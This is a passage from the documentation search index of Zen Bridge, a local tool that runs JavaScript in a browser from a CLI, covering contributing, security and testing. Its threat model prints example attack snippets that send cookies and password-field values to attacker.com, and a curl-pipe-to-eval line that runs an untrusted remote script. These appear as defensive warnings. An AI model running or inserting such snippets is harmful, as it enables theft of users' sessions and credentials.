*/\n(function() {\n    'use strict';\n\n    try {\n        // Your code here\n        const data = document.querySelectorAll('.item');\n        const results = Array.from(data).map(el =&gt; ({\n            text: el.textContent.trim(),\n            href: el.querySelector('a')?.href\n        }));\n\n        return {\n            ok: true,\n            results: results,\n            count: results.length\n        };\n    } catch (error) {\n        return {\n            ok: false,\n            error: error.message\n        };\n    }\n})();\n</code></pre> <p>Guidelines:</p> <ul> <li>Use IIFE (Immediately Invoked Function Expression)</li> <li><code>'use strict';</code> at the top</li> <li>Prefer <code>const</code> over <code>let</code>, never <code>var</code></li> <li>Use modern ES6+ syntax</li> <li>Handle errors gracefully</li> <li>Return structured objects</li> </ul>"},{"location":"development/contributing/#testing","title":"Testing","text":""},{"location":"development/contributing/#running-tests","title":"Running Tests","text":"<pre><code># All tests\npytest\n\n# Unit tests only\npytest tests/unit/\n\n# Integration tests\npytest tests/integration/\n\n# Specific test\npytest tests/unit/test_models.py::TestExecuteRequest\n\n# With coverage report\npytest --cov=zen --cov-report=html\nopen htmlcov/index.html\n</code></pre>"},{"location":"development/contributing/#writing-tests","title":"Writing Tests","text":"<p>Unit test example:</p> <pre><code># tests/unit/test_my_feature.py\nimport pytest\nfrom zen.services.my_service import MyService\n\n\nclass TestMyService:\n    \"\"\"Test MyService functionality.\"\"\"\n\n    def test_initialization(self):\n        \"\"\"Test service can be initialized.\"\"\"\n        service = MyService()\n        assert service is not None\n\n    def test_process_data(self):\n        \"\"\"Test data processing.\"\"\"\n        service = MyService()\n        result = service.process(\"input\")\n        assert result == \"processed: input\"\n\n    def test_invalid_input(self):\n        \"\"\"Test handling of invalid input.\"\"\"\n        service = MyService()\n        with pytest.raises(ValueError):\n            service.process(\"\")\n</code></pre> <p>Async test example:</p> <pre><code>import pytest\n\n\n@pytest.mark.asyncio\nasync def test_async_operation():\n    \"\"\"Test async operation.\"\"\"\n    from zen.adapters import filesystem\n\n    content = await filesystem.read_text_async(Path(\"test.txt\"))\n    assert content is not None\n</code></pre>"},{"location":"development/contributing/#test-coverage","title":"Test Coverage","text":"<p>Target: 80%+ overall, 90%+ for services</p> <p>Check coverage:</p> <pre><code>pytest --cov=zen --cov-report=term-missing\n</code></pre>"},{"location":"development/contributing/#commit-guidelines","title":"Commit Guidelines","text":"<p>We follow Conventional Commits specification.</p>"},{"location":"development/contributing/#format","title":"Format","text":"<pre><code>&lt;type&gt;(&lt;scope&gt;): &lt;subject&gt;\n\n&lt;body&gt;\n\n&lt;footer&gt;\n</code></pre>"},{"location":"development/contributing/#examples","title":"Examples","text":"<pre><code># New feature\ngit commit -m \"feat(cli): add extract-cookies command\"\n\n# Bug fix\ngit commit -m \"fix(server): prevent event loop blocking in file I/O\n\nFixed blocking I/O operations in bridge_ws.py by using\nasync file operations from filesystem adapter.\"\n\n# Documentation\ngit commit -m \"docs(contributing): add testing guidelines\"\n\n# Breaking change\ngit commit -m \"feat(config)!: require Python 3.11+\n\nBREAKING CHANGE: Drop support for Python 3.7-3.10\"\n</code></pre>"},{"location":"development/contributing/#best-practices","title":"Best Practices","text":"<ul> <li>\u2705 Use present tense: \"add feature\" not \"added feature\"</li> <li>\u2705 Use imperative mood: \"move cursor\" not \"moves cursor\"</li> <li>\u2705 Keep subject line under 72 characters</li> <li>\u2705 Explain what and why, not how</li> <li>\u274c Don't end subject with period</li> </ul>"},{"location":"development/contributing/#pull-request-process","title":"Pull Request Process","text":""},{"location":"development/contributing/#1-pre-submission-checklist","title":"1. Pre-submission Checklist","text":"<p>Before submitting PR:</p> <ul> <li> All tests pass (<code>pytest</code>)</li> <li> Code is formatted (<code>ruff format zen/</code>)</li> <li> No linting errors (<code>ruff check zen/</code>)</li> <li> Type checking passes (<code>mypy zen/</code>)</li> <li> Documentation updated (if applicable)</li> <li> Commit messages follow Conventional Commits</li> <li> No breaking changes (or documented)</li> <li> Manual testing done</li> </ul>"},{"location":"development/contributing/#2-create-pull-request","title":"2. Create Pull Request","text":"<ol> <li>Push your branch</li> <li>Go to GitHub repository</li> <li>Click \"New Pull Request\"</li> <li>Fill out PR template:</li> <li>Description: What does this PR do?</li> <li>Motivation: Why is this change needed?</li> <li>Testing: How was this tested?</li> <li>Screenshots: If UI changes</li> <li>Checklist: Complete items</li> </ol>"},{"location":"development/contributing/#3-code-review","title":"3. Code Review","text":"<ul> <li>Address reviewer feedback promptly</li> <li>Make requested changes</li> <li>Push updates (no force-push unless necessary)</li> <li>Keep discussion professional and constructive</li> </ul>"},{"location":"development/contributing/#4-merge","title":"4. Merge","text":"<p>Once approved, maintainer will merge using:</p> <ul> <li>Squash merge for single feature</li> <li>Merge commit for multi-commit features</li> <li>Rebase for clean history</li> </ul>"},{"location":"development/contributing/#common-tasks","title":"Common Tasks","text":""},{"location":"development/contributing/#adding-a-new-cli-command","title":"Adding a New CLI Command","text":"Current Approach (v1.0.0)Refactored Approach (Phase 2+) <p>Edit <code>zen/cli.py</code>:</p> <pre><code>@cli.command()\n@click.argument(\"arg\")\n@click.option(\"--timeout\", type=float, default=10.0)\ndef my_command(arg: str, timeout: float) -&gt; None:\n    \"\"\"My new command.\"\"\"\n    client = BridgeClient()\n\n    # Load script\n    script_path = Path(__file__).parent / \"scripts\" / \"my_script.js\"\n    with open(script_path) as f:\n        code = f.read()\n\n    # Execute\n    result = client.execute(code, timeout=timeout)\n    click.echo(result.get(\"result\"))\n</code></pre> <p>Create <code>zen/app/cli/my_commands.py</code>:</p> <pre><code>import click\nfrom zen.services.bridge_executor import get_executor\nfrom zen.services.script_loader import ScriptLoader\n\n\n@click.command()\n@click.argument(\"arg\")\n@click.option(\"--timeout\", type=float, default=10.0)\ndef my_command(arg: str, timeout: float) -&gt; None:\n    \"\"\"My new command.\"\"\"\n    # Load script via service\n    loader = ScriptLoader()\n    code = loader.load_script(\"my_script.js\")\n\n    # Execute via service\n    executor = get_executor()\n    result = executor.execute(code, timeout=timeout)\n\n    click.echo(result[\"result\"])\n</code></pre> <p>Register in <code>zen/app/cli/__init__.py</code>:</p> <pre><code>from zen.app.cli.my_commands import my_command\n\ncli.add_command(my_command)\n</code></pre>"},{"location":"development/contributing/#adding-a-new-javascript-script","title":"Adding a New JavaScript Script","text":"<ol> <li>Create script in <code>zen/scripts/my_script.js</code>:</li> </ol> <pre><code>/**\n * Extract data from page.\n * @returns {Object} Extracted data\n */\n(function() {\n    'use strict';\n\n    try {\n        const items = document.querySelectorAll('.item');\n        const results = Array.from(items).map(el =&gt; ({\n            text: el.textContent.trim(),\n            href: el.querySelector('a')?.href\n        }));\n\n        return {\n            ok: true,\n            results: results,\n            count: results.length\n        };\n    } catch (error) {\n        return {\n            ok: false,\n            error: error.message\n        };\n    }\n})();\n</code></pre> <ol> <li>Create CLI command (see above)</li> <li>Test on real page</li> <li>Document in README.md</li> </ol>"},{"location":"development/contributing/#running-locally-with-live-reload","title":"Running Locally with Live Reload","text":"<pre><code># Terminal 1: Server (auto-restarts on changes)\npython zen/bridge_ws.py\n\n# Terminal 2: Make changes\nvim zen/app/cli/my_commands.py\n\n# Terminal 3: Test\nzen my-command test-arg\n</code></pre>"},{"location":"development/contributing/#debugging-tips","title":"Debugging Tips","text":""},{"location":"development/contributing/#enable-verbose-logging","title":"Enable Verbose Logging","text":"<p>Server side:</p> <pre><code>zen server start  # Already verbose\n</code></pre> <p>Browser side - Edit <code>userscript_ws.js</code>:</p> <pre><code>const VERBOSE = true;  // Set to true\n</code></pre>"},{"location":"development/contributing/#check-server-status","title":"Check Server Status","text":"<pre><code># Is server running?\nzen server status\n\n# Health check\ncurl http://127.0.0.1:8765/health\n\n# Check notifications\ncurl http://127.0.0.1:8765/notifications\n</code></pre>"},{"location":"development/contributing/#websocket-connection-issues","title":"WebSocket Connection Issues","text":"<ol> <li>Check browser console for errors</li> <li>Verify Tampermonkey script is active</li> <li>Refresh page to reconnect</li> <li>Check firewall (allow localhost)</li> <li>Verify server is running</li> </ol>"},{"location":"development/contributing/#command-not-working","title":"Command Not Working","text":"<ol> <li>Test simple command: <code>zen eval \"1+1\"</code></li> <li>Check browser console for JavaScript errors</li> <li>Check server logs</li> <li>Verify userscript is loaded</li> <li>Try on different page</li> </ol>"},{"location":"development/contributing/#getting-help","title":"Getting Help","text":"<ul> <li>Documentation: See Architecture, Testing</li> <li>GitHub Issues: Open an issue</li> <li>Discussions: Use GitHub Discussions for questions</li> <li>Bug Reports: Include reproducible example</li> </ul>"},{"location":"development/contributing/#resources","title":"Resources","text":"<ul> <li>Architecture Documentation</li> <li>Testing Guide</li> <li>Security Guide</li> </ul> <p>For additional technical documentation, see the project repository root files: - <code>ARCHITECTURE.md</code> - Complete architecture documentation - <code>PROTOCOL.md</code> - WebSocket protocol specification - <code>REFACTOR_PLAN.md</code> - Refactoring progress and phases</p>"},{"location":"development/contributing/#code-of-conduct","title":"Code of Conduct","text":"<p>Be respectful, constructive, and inclusive. We're all here to build something useful together.</p>"},{"location":"development/contributing/#license","title":"License","text":"<p>By contributing, you agree that your contributions will be licensed under the MIT License.</p> <p>Thank you for contributing to Zen Bridge! \ud83c\udf89</p>"},{"location":"development/security/","title":"Security","text":"<p>Security considerations, threat model, and best practices for Zen Bridge.</p>"},{"location":"development/security/#overview","title":"Overview","text":"<p>Zen Bridge is a local development tool with a pragmatic security model designed for trusted development environments.</p>"},{"location":"development/security/#core-principles","title":"Core Principles","text":"<ol> <li>Localhost-only - Server binds to <code>127.0.0.1</code> exclusively</li> <li>No remote access - Not designed or hardened for internet exposure</li> <li>User trust model - Users must trust JavaScript code they execute</li> <li>Browser security - Relies on browser sandboxing and same-origin policy</li> </ol>"},{"location":"development/security/#threat-model","title":"Threat Model","text":""},{"location":"development/security/#in-scope","title":"In Scope","text":"<p>These threats are relevant and mitigated:</p>"},{"location":"development/security/#1-malicious-javascript-execution","title":"1. Malicious JavaScript Execution","text":"<p>Threat: User executes untrusted JavaScript that steals data or performs unwanted actions.</p> <p>Impact: High - Can steal cookies, make requests, modify DOM</p> <p>Mitigation:</p> <ul> <li>\u2705 Explicit user action required (no automatic execution)</li> <li>\u2705 Scripts are visible before execution</li> <li>\u2705 User can review code in terminal or files</li> <li>\u2705 Browser sandbox provides isolation</li> </ul> <p>Example attack:</p> <pre><code># Attacker tricks user into running malicious script\nzen eval \"fetch('https://attacker.com/steal?cookies=' + document.cookie)\"\n</code></pre> <p>Defense: User education - only run trusted scripts</p>"},{"location":"development/security/#2-local-privilege-escalation","title":"2. Local Privilege Escalation","text":"<p>Threat: Malicious script escalates privileges on local machine.</p> <p>Impact: Medium - Limited by browser sandbox</p> <p>Mitigation:</p> <ul> <li>\u2705 Browser sandbox isolates script execution</li> <li>\u2705 Scripts cannot access filesystem directly</li> <li>\u2705 Python server runs with user privileges (not elevated)</li> <li>\u2705 No shell command execution from browser</li> </ul>"},{"location":"development/security/#3-configuration-tampering","title":"3. Configuration Tampering","text":"<p>Threat: Malicious process modifies <code>config.json</code> to enable harmful behavior.</p> <p>Impact: Low - Configuration has minimal attack surface</p> <p>Mitigation:</p> <ul> <li>\u2705 No security-critical settings</li> <li>\u2705 All communication is localhost-only</li> <li>\u2705 File permissions follow OS defaults</li> <li>\u2705 No automatic config reload</li> </ul>"},{"location":"development/security/#4-userscript-injection-attacks","title":"4. Userscript Injection Attacks","text":"<p>Threat: Malicious website exploits userscript to execute code.</p> <p>Impact: Medium - Limited to browser context</p> <p>Mitigation:</p> <ul> <li>\u2705 Userscript runs on all sites (<code>@match *://*/*</code>)</li> <li>\u2705 Only executes code from authenticated WebSocket</li> <li>\u2705 Only active tab processes commands</li> <li>\u2705 Same-origin policy still applies</li> </ul>"},{"location":"development/security/#out-of-scope","title":"Out of Scope","text":"<p>These threats are explicitly out of scope:</p>"},{"location":"development/security/#1-remote-attacks","title":"1. Remote Attacks","text":"<p>Not applicable: Server never exposed to network by design.</p> <ul> <li>\u2705 Localhost binding (<code>127.0.0.1</code>) prevents remote access</li> <li>\u2705 No configuration option to bind to public IPs</li> <li>\u2705 Firewall provides additional protection</li> </ul>"},{"location":"development/security/#2-network-based-attacks","title":"2. Network-Based Attacks","text":"<p>Not applicable: All communication is localhost-only.</p> <ul> <li>\u2705 Traffic never leaves the machine</li> <li>\u2705 No network interception possible</li> <li>\u2705 OS kernel handles localhost communication</li> </ul>"},{"location":"development/security/#3-man-in-the-middle-attacks","title":"3. Man-in-the-Middle Attacks","text":"<p>Not applicable: Localhost communication cannot be intercepted.</p> <ul> <li>\u2705 Loopback interface is kernel-managed</li> <li>\u2705 No external network involvement</li> <li>\u2705 Local user with root can already compromise system</li> </ul>"},{"location":"development/security/#4-browser-vulnerabilities","title":"4. Browser Vulnerabilities","text":"<p>Separate concern: Browser security is vendor responsibility.</p> <ul> <li>\u2705 Zen Bridge relies on browser sandboxing</li> <li>\u2705 No additional browser security bypass</li> <li>\u2705 Keep browser updated (user responsibility)</li> </ul>"},{"location":"development/security/#security-features","title":"Security Features","text":""},{"location":"development/security/#network-security","title":"Network Security","text":""},{"location":"development/security/#localhost-binding","title":"Localhost Binding","text":"<p>Server always binds to <code>127.0.0.1</code>:</p> <pre><code># zen/bridge_ws.py\nHOST = \"127.0.0.1\"  # Never binds to 0.0.0.0 or public IPs\nPORT = 8765\n</code></pre> <p>Guarantees:</p> <ul> <li>\u2705 No remote connections possible</li> <li>\u2705 Only local processes can connect</li> <li>\u2705 Protected by OS networking stack</li> </ul> <p>Never Bind to 0.0.0.0</p> <p>Modifying <code>HOST</code> to <code>0.0.0.0</code> or any public IP would expose your browser to remote code execution. This is extremely dangerous and defeats all security measures.</p>"},{"location":"development/security/#no-authentication-required","title":"No Authentication Required","text":"<p>Current status: No authentication between CLI and server.</p> <p>Rationale:</p> <ul> <li>\u2705 Localhost-only reduces attack surface</li> <li>\u2705 If machine is compromised, attacker has access anyway</li> <li>\u2705 Simplifies development workflow</li> <li>\u2705 User controls when server runs</li> </ul> <p>Future enhancement: Optional token-based authentication for additional security.</p>"},{"location":"development/security/#no-encryption","title":"No Encryption","text":"<p>WebSocket traffic is unencrypted (<code>ws://</code> instead of <code>wss://</code>).</p> <p>Why acceptable:</p> <ul> <li>\u2705 Traffic never leaves localhost</li> <li>\u2705 OS kernel handles loopback communication</li> <li>\u2705 Faster performance without TLS</li> <li>\u2705 No certificate management needed</li> </ul> <p>Warning</p> <p>If you modify HOST to bind to public IPs, traffic would be unencrypted over the network. This is unacceptable and dangerous.</p>"},{"location":"development/security/#code-execution-security","title":"Code Execution Security","text":""},{"location":"development/security/#all-execution-is-intentional","title":"All Execution is Intentional","text":"<pre><code># User must explicitly run commands\nzen eval \"document.title\"        # Explicit\nzen exec script.js               # Explicit\nzen extract-links                # Explicit\n\n# No automatic execution on server start\nzen server start  # Only starts server, no code execution\n</code></pre> <p>Properties:</p> <ul> <li>\u2705 User must type command explicitly</li> <li>\u2705 No background execution</li> <li>\u2705 Clear audit trail in terminal</li> <li>\u2705 Code visible before execution</li> </ul>"},{"location":"development/security/#user-must-install-userscript","title":"User Must Install Userscript","text":"<p>Installation steps:</p> <ol> <li>User downloads <code>userscript_ws.js</code></li> <li>User opens Tampermonkey/Violentmonkey</li> <li>User creates new script</li> <li>User pastes and saves</li> <li>User can review code anytime</li> <li>User can disable/uninstall anytime</li> </ol> <p>Properties:</p> <ul> <li>\u2705 Explicit installation required</li> <li>\u2705 Code is visible and reviewable</li> <li>\u2705 Can be disabled instantly</li> <li>\u2705 User has full control</li> </ul>"},{"location":"development/security/#scripts-from-trusted-filesystem","title":"Scripts from Trusted Filesystem","text":"<p>Built-in scripts loaded from package installation:</p> <pre><code># zen/services/script_loader.py\nscript_path = Path(__file__).parent.parent / \"scripts\" / script_name\n</code></pre> <p>Security considerations:</p> <ul> <li>\u2705 Scripts bundled with package</li> <li>\u2705 Installed from trusted source (PyPI, GitHub)</li> <li>\u2705 Cannot be modified without user action</li> <li>\u2705 Standard file permissions apply</li> </ul>"},{"location":"development/security/#configuration-security","title":"Configuration Security","text":""},{"location":"development/security/#no-secrets-required","title":"No Secrets Required","text":"<p>Configuration file contains no sensitive data:</p> <pre><code>{\n  \"ai-language\": \"nl\",\n  \"control\": {\n    \"auto-refocus\": \"always\",\n    \"speak-all\": true,\n    \"verbose\": true\n  }\n}\n</code></pre> <p>Properties:</p> <ul> <li>\u2705 No API keys</li> <li>\u2705 No passwords</li> <li>\u2705 No tokens</li> <li>\u2705 Safe to commit (if desired)</li> </ul>"},{"location":"development/security/#no-secrets-in-logs","title":"No Secrets in Logs","text":"<p>Server logs connection events only:</p> <pre><code>HTTP server running on http://127.0.0.1:8765\nWebSocket connection opened (active: 1)\nRequest abc-123: pending\nRequest abc-123: completed (success)\n</code></pre> <p>Properties:</p> <ul> <li>\u2705 No page content logged</li> <li>\u2705 No sensitive data logged</li> <li>\u2705 Request IDs are UUIDs (not predictable)</li> <li>\u2705 Error messages sanitized</li> </ul>"},{"location":"development/security/#best-practices","title":"Best Practices","text":""},{"location":"development/security/#for-users","title":"For Users","text":""},{"location":"development/security/#1-only-run-trusted-javascript","title":"1. Only Run Trusted JavaScript","text":"<pre><code># \u2705 Good: Review script first\ncat my_script.js\nzen exec my_script.js\n\n# \u2705 Good: Understand inline code\nzen eval \"document.querySelectorAll('a').length\"\n\n# \u274c Bad: Run unknown script\ncurl https://untrusted.com/script.js | zen eval  # DON'T!\n</code></pre>"},{"location":"development/security/#2-review-scripts-before-execution","title":"2. Review Scripts Before Execution","text":"<p>Before running any script:</p> <ol> <li>Read the JavaScript code completely</li> <li>Understand what it does</li> <li>Check for network requests</li> <li>Look for data exfiltration</li> <li>Test on non-sensitive pages first</li> </ol>"},{"location":"development/security/#3-dont-modify-server-binding","title":"3. Don't Modify Server Binding","text":"<p>Never change <code>HOST</code> in <code>bridge_ws.py</code>:</p> <pre><code># \u274c DANGEROUS - Do NOT do this!\nHOST = \"0.0.0.0\"           # Exposes to network\nHOST = \"192.168.1.100\"     # Exposes to LAN\n</code></pre> <p>This would allow remote code execution in your browser.</p>"},{"location":"development/security/#4-keep-userscript-updated","title":"4. Keep Userscript Updated","text":"<pre><code># Check version\nzen eval \"window.__ZEN_BRIDGE_VERSION__\"\n# Current version: 3.4\n</code></pre> <p>Update when new versions are released for security fixes.</p>"},{"location":"development/security/#5-stop-server-when-not-in-use","title":"5. Stop Server When Not in Use","text":"<pre><code># Stop when done\nzen server stop\n\n# Check status\nzen server status\n</code></pre> <p>If server isn't running, attack surface is eliminated.</p>"},{"location":"development/security/#6-use-firewall-defense-in-depth","title":"6. Use Firewall (Defense in Depth)","text":"<p>Even with localhost binding, add firewall rules:</p> <pre><code># macOS\nsudo /usr/libexec/ApplicationFirewall/socketfilterfw --add /usr/local/bin/python3\nsudo /usr/libexec/ApplicationFirewall/socketfilterfw --block /usr/local/bin/python3\n\n# Linux (iptables)\nsudo iptables -A INPUT -p tcp --dport 8765 -s 127.0.0.1 -j ACCEPT\nsudo iptables -A INPUT -p tcp --dport 8765 -j DROP\n</code></pre>"},{"location":"development/security/#for-developers","title":"For Developers","text":""},{"location":"development/security/#1-validate-all-inputs","title":"1. Validate All Inputs","text":"<pre><code># \u2705 Good: Validate with Pydantic\nfrom zen.domain.models import RunRequest\n\ndata = await request.json()\nvalidated = RunRequest(**data)  # Raises ValidationError if invalid\n\n# \u274c Bad: No validation\ndata = await request.json()\ncode = data[\"code\"]  # Could be missing or wrong type\n</code></pre>"},{"location":"development/security/#2-sanitize-error-messages","title":"2. Sanitize Error Messages","text":"<pre><code># \u2705 Good: Generic error\nreturn web.json_response(\n    {\"ok\": False, \"error\": \"Request failed\"},\n    status=500\n)\n\n# \u274c Bad: Leaks paths\nreturn web.json_response(\n    {\"ok\": False, \"error\": f\"File not found: {user_path}\"},\n    status=500\n)\n</code></pre>"},{"location":"development/security/#3-no-secrets-in-code-or-logs","title":"3. No Secrets in Code or Logs","text":"<pre><code># \u2705 Good: Don't log sensitive data\nlogger.info(f\"Request {request_id} completed\")\n\n# \u274c Bad: Logs cookies\nlogger.info(f\"Cookies: {cookies}\")\n</code></pre>"},{"location":"development/security/#4-follow-least-privilege","title":"4. Follow Least Privilege","text":"<ul> <li>Run server with user privileges (not root/admin)</li> <li>Don't request unnecessary browser permissions</li> <li>Limit userscript to minimum required</li> <li>Don't expose internal state unnecessarily</li> </ul>"},{"location":"development/security/#5-document-security-assumptions","title":"5. Document Security Assumptions","text":"<p>When adding features:</p> <ul> <li>What security assumptions are made?</li> <li>What trust is required from user?</li> <li>What could go wrong if misused?</li> <li>What threat model applies?</li> </ul>"},{"location":"development/security/#known-limitations","title":"Known Limitations","text":""},{"location":"development/security/#1-arbitrary-javascript-execution","title":"1. Arbitrary JavaScript Execution","text":"<p>By design: Zen Bridge executes arbitrary JavaScript.</p> <p>Implications:</p> <ul> <li>Can steal session cookies</li> <li>Can submit forms, make purchases</li> <li>Can read sensitive page content</li> <li>Can modify DOM, inject content</li> <li>Can make network requests</li> </ul> <p>Example attack:</p> <pre><code>// Steal all cookies\ndocument.cookie.split(';').forEach(cookie =&gt; {\n    fetch('https://attacker.com/steal?c=' + encodeURIComponent(cookie));\n});\n\n// Steal form data\ndocument.querySelectorAll('input[type=password]').forEach(input =&gt; {\n    fetch('https://attacker.com/steal?pwd=' + input.value);\n});\n</code></pre> <p>Defense: Only run JavaScript you trust and understand.</p>"},{"location":"development/security/#2-no-authentication","title":"2. No Authentication","text":"<p>Current status: Any local process can use bridge.</p> <p>Implications:</p> <ul> <li>Local malware can execute JavaScript</li> <li>Other users on same machine can use bridge</li> <li>No audit of who executed what</li> </ul> <p>Acceptable because:</p> <ul> <li>Localhost-only reduces exposure</li> <li>Compromised machine has bigger problems</li> <li>User controls when server runs</li> </ul> <p>Future enhancement: Optional token authentication.</p>"},{"location":"development/security/#3-no-rate-limiting","title":"3. No Rate Limiting","text":"<p>Current status: No limits on request rate.</p> <p>Implications:</p> <ul> <li>Buggy script can spam requests</li> <li>Could cause high CPU in browser</li> <li>Could cause memory buildup</li> </ul> <p>Acceptable because:</p> <ul> <li>User controls both CLI and server</li> <li>Easy to stop server if needed</li> <li>Cleanup task removes old requests</li> </ul> <p>Future enhancement: Optional rate limiting.</p>"},{"location":"development/security/#4-no-audit-logging","title":"4. No Audit Logging","text":"<p>Current status: No persistent log of commands.</p> <p>Implications:</p> <ul> <li>No history of what was executed</li> <li>Cannot review past actions</li> <li>Cannot detect suspicious activity</li> </ul> <p>Future enhancement: Optional audit log.</p>"},{"location":"development/security/#vulnerability-reporting","title":"Vulnerability Reporting","text":""},{"location":"development/security/#how-to-report","title":"How to Report","text":"<p>If you discover a security vulnerability:</p> <ol> <li>Do NOT open public GitHub issue</li> <li>Email maintainer directly via GitHub profile</li> <li>Include [SECURITY] in subject</li> <li>Provide:</li> <li>Description of vulnerability</li> <li>Steps to reproduce</li> <li>Potential impact</li> <li>Suggested fix (if any)</li> </ol>"},{"location":"development/security/#response-timeline","title":"Response Timeline","text":"<ul> <li>Initial response: Within 48 hours</li> <li>Assessment: Within 1 week</li> <li>Fix timeline:</li> <li>Critical: 1-7 days</li> <li>High: 1-2 weeks</li> <li>Medium: 2-4 weeks</li> <li>Low: Best effort</li> </ul>"},{"location":"development/security/#responsible-disclosure","title":"Responsible Disclosure","text":"<p>We follow responsible disclosure:</p> <ol> <li>Report received and acknowledged</li> <li>Vulnerability validated</li> <li>Fix developed privately</li> <li>Coordinated disclosure timeline</li> <li>Public release with fix</li> <li>Reporter credited (if desired)</li> </ol>"},{"location":"development/security/#future-enhancements","title":"Future Enhancements","text":""},{"location":"development/security/#1-optional-token-authentication","title":"1. Optional Token Authentication","text":"<p>Proposal: Add optional authentication token.</p> <pre><code># Server generates token on start\nzen server start\n# Server token: abc123xyz\n\n# CLI uses token\nzen eval \"code\" --token abc123xyz\n\n# Or environment variable\nexport ZEN_BRIDGE_TOKEN=abc123xyz\nzen eval \"code\"\n</code></pre> <p>Benefits:</p> <ul> <li>Prevents other local processes from using bridge</li> <li>Optional (disabled by default)</li> <li>Additional security layer</li> </ul>"},{"location":"development/security/#2-websocket-origin-validation","title":"2. WebSocket Origin Validation","text":"<p>Proposal: Validate <code>Origin</code> header.</p> <pre><code>async def websocket_handler(request):\n    origin = request.headers.get('Origin', '')\n\n    # Only accept browser extensions\n    if not (origin.startswith('moz-extension://') or\n            origin.startswith('chrome-extension://')):\n        return web.Response(status=403)\n</code></pre> <p>Benefits:</p> <ul> <li>Prevents malicious websites from connecting</li> <li>Additional protection against local web attacks</li> </ul>"},{"location":"development/security/#3-rate-limiting","title":"3. Rate Limiting","text":"<p>Proposal: Add rate limiting to endpoints.</p> <pre><code># 100 requests per minute\nrate_limiter = RateLimiter(requests=100, period=60)\n\nasync def handle_http_run(request):\n    if not rate_limiter.allow():\n        return web.json_response(\n            {\"ok\": False, \"error\": \"Rate limit exceeded\"},\n            status=429\n        )\n</code></pre> <p>Benefits:</p> <ul> <li>Prevents accidental DoS</li> <li>Limits impact of malicious processes</li> <li>Protects browser from excessive execution</li> </ul>"},{"location":"development/security/#4-audit-logging","title":"4. Audit Logging","text":"<p>Proposal: Optional command history log.</p> <pre><code># Enable\nzen config set audit.enabled true\n\n# Log format\n[2025-10-27 10:30:45] EVAL \"document.title\" -&gt; \"Example\"\n[2025-10-27 10:31:12] EXEC script.js -&gt; OK\n</code></pre> <p>Benefits:</p> <ul> <li>Review command history</li> <li>Detect suspicious activity</li> <li>Debugging aid</li> </ul>"},{"location":"development/security/#5-content-security-policy-awareness","title":"5. Content Security Policy Awareness","text":"<p>Proposal: Detect and warn about CSP.</p> <pre><code>zen eval \"fetch('https://api.example.com')\"\n# Warning: Page has CSP that may block fetch\n# CSP: default-src 'self'\n</code></pre> <p>Benefits:</p> <ul> <li>Better UX (explain failures)</li> <li>Security awareness</li> <li>Debugging aid</li> </ul>"},{"location":"development/security/#security-checklist","title":"Security Checklist","text":""},{"location":"development/security/#for-new-features","title":"For New Features","text":"<p>Before merging:</p> <ul> <li> Network binding: Binds to <code>127.0.0.1</code> only?</li> <li> Code execution: Requires explicit user action?</li> <li> Logging: No sensitive data logged?</li> <li> Input validation: All inputs validated?</li> <li> Error handling: Error messages sanitized?</li> <li> Dependencies: Dependencies audited?</li> <li> Configuration: No security-critical settings?</li> <li> Documentation: Security assumptions documented?</li> </ul>"},{"location":"development/security/#summary","title":"Summary","text":"<p>Zen Bridge security model:</p> <p>Core Principles:</p> <ol> <li>Localhost-only (never network-exposed)</li> <li>User trusts scripts they execute</li> <li>No authentication (localhost trust model)</li> <li>Browser provides security boundary</li> </ol> <p>Acceptable Risks:</p> <ul> <li>Local processes can connect</li> <li>Arbitrary JavaScript execution (by design)</li> <li>No encryption for localhost traffic</li> </ul> <p>Unacceptable Risks:</p> <ul> <li>Remote code execution (prevented by localhost binding)</li> <li>Automatic code execution (requires user action)</li> <li>Secret leakage (no secrets in config/logs)</li> </ul> <p>User Responsibility:</p> <ul> <li>Only execute trusted JavaScript</li> <li>Keep userscript updated</li> <li>Review scripts before running</li> <li>Don't modify server to bind to public IPs</li> </ul> <p>This security model is appropriate for a development tool on a trusted local machine. For production or high-security environments, consider additional measures from the Future Enhancements section.</p>"},{"location":"development/security/#resources","title":"Resources","text":"<ul> <li>Architecture Guide - System design</li> <li>Contributing Guide - Development workflow</li> </ul> <p>For the complete security policy, see <code>SECURITY.md</code> in the project repository root.</p> <p>Stay secure and happy coding!</p>"},{"location":"development/testing/","title":"Testing Guide","text":"<p>Comprehensive guide to testing Zen Bridge. This covers unit tests, integration tests, E2E tests, and test coverage strategies.</p>"},{"location":"development/testing/#overview","title":"Overview","text":"<p>Zen Bridge uses pytest as the testing framework with support for:</p> <ul> <li>Unit tests - Fast, isolated tests for individual functions</li> <li>Integration tests - Multi-component tests (CLI + server)</li> <li>E2E tests - Full browser integration tests</li> <li>Async tests - Tests for async/await code</li> <li>Coverage tracking - Code coverage reporting</li> </ul>"},{"location":"development/testing/#test-structure","title":"Test Structure","text":"<pre><code>tests/\n\u251c\u2500\u2500 conftest.py              # Shared fixtures\n\u251c\u2500\u2500 test_smoke.py            # Basic smoke tests (24 tests)\n\u2502\n\u251c\u2500\u2500 unit/                    # Unit tests (fast, isolated)\n\u2502   \u251c\u2500\u2500 __init__.py\n\u2502   \u251c\u2500\u2500 test_models.py       # Pydantic models (28 tests)\n\u2502   \u251c\u2500\u2500 test_script_loader.py\n\u2502   \u251c\u2500\u2500 test_bridge_executor.py\n\u2502   \u251c\u2500\u2500 test_ai_integration.py\n\u2502   \u2514\u2500\u2500 test_control_manager.py\n\u2502\n\u251c\u2500\u2500 integration/             # Integration tests (server + client)\n\u2502   \u251c\u2500\u2500 __init__.py\n\u2502   \u251c\u2500\u2500 test_bridge_loop.py\n\u2502   \u2514\u2500\u2500 test_cli_integration.py\n\u2502\n\u251c\u2500\u2500 e2e/                     # End-to-end tests (browser)\n\u2502   \u251c\u2500\u2500 __init__.py\n\u2502   \u2514\u2500\u2500 test_browser_integration.py\n\u2502\n\u2514\u2500\u2500 fixtures/                # Test data\n    \u251c\u2500\u2500 test_page.html\n    \u2514\u2500\u2500 mock_scripts.js\n</code></pre>"},{"location":"development/testing/#running-tests","title":"Running Tests","text":""},{"location":"development/testing/#all-tests","title":"All Tests","text":"<pre><code># Run all tests\npytest\n\n# With verbose output\npytest -v\n\n# With very verbose output\npytest -vv\n</code></pre>"},{"location":"development/testing/#specific-test-suites","title":"Specific Test Suites","text":"<pre><code># Unit tests only (fast)\npytest tests/unit/\n\n# Integration tests (requires server)\npytest tests/integration/\n\n# E2E tests (requires browser)\npytest tests/e2e/ -m e2e\n\n# Smoke tests only\npytest tests/test_smoke.py\n</code></pre>"},{"location":"development/testing/#specific-tests","title":"Specific 